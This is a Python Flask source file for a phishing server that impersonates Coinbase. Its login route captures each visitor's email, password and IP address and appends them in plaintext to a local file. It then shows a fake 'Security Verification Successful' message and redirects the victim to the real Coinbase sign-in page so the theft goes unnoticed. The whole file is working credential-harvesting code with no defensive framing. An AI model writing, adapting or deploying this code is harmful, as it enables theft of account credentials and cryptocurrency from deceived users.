from flask import Flask, request, redirect
import datetime
import os

app = Flask(__name__)

@app.route('/')
def index():
    return open('index.html').read()

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    log_entry = f"{timestamp} | {ip} | {email} | {password}\n"
    print(f"Logging: {log_entry.strip()}")
    
    with open("logins.txt", "a") as f:
        f.write(log_entry)
    
    # Use a direct landing page message with a redirect fallback
    return """
    <html>
        <head>
            <title>Redirecting...</title>
            <meta http-equiv="refresh" content="3;url=https://www.coinbase.com/signin">
        </head>
        <body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
            <div style="max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #eee; border-radius: 8px;">
                <h2 style="color: #0052FF;">Security Verification Successful</h2>
                <p>Redirecting you to Coinbase safely...</p>
                <p style="font-size: 12px; color: #666;">If you are not redirected automatically, <a href="https://www.coinbase.com/signin">click here</a>.</p>
            </div>
        </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
